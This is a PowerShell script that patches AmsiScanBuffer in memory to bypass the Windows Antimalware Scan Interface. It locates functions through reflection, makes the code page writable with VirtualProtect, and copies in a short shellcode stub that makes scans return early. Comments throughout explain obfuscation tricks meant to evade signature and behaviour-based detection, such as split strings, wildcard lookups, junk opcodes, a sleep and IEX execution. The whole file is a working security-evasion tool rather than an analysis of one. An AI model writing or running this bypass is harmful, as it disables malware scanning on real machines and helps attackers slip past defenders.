function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddr*ss") {$tmp+=$_}} # Insert wildcard characters to obfuscate the function name
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Obfuscate the input params to the lookup function
$params = @("msi", "S", "B", "ff"); 

# Call lookup function with amsi.dll and AmsiScanBuffer as parameters (obfuscated)
[IntPtr]$funcAddr = LookupFunc $(("a{0}" -f $params[0])+".d"+"ll") ("A{0}{1}can{2}u{3}er" -f $params)  
# Obfuscate the oldProtectionBuffer variable, used in the vp.Invoke call
$oldProtectionBuffer = 0  
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
# Change the [ref] 0 to [ref]$oldProtectionBuffer to obfuscate the call
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) 

# Shell code injected into memory, 2 junk assembly operations are added, could technically be removed but they help to bypasss the behaviour based detection
# We technically only need to add the timeout error code to the EAX register, and then return (behaviour based detection will most likely catch this simple version of the bypass)
$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)

# Obfuscate the parameters used in the Marshal Copy call
$in = $buf
$zero = 0
$pointer = $funcAddr
$twelve = 12

# Split the marshal copy into 2 variables
$a='[System.Runtime.InteropServices.Marshal]::Co'
$b='py($in, $zero, $pointer, $twelve)'

# Add this to sleep to make it harder for the behaviour based detection to catch this script
Start-Sleep 4

# Execute the marshal copy call
IEX("$a{0}" -f $b)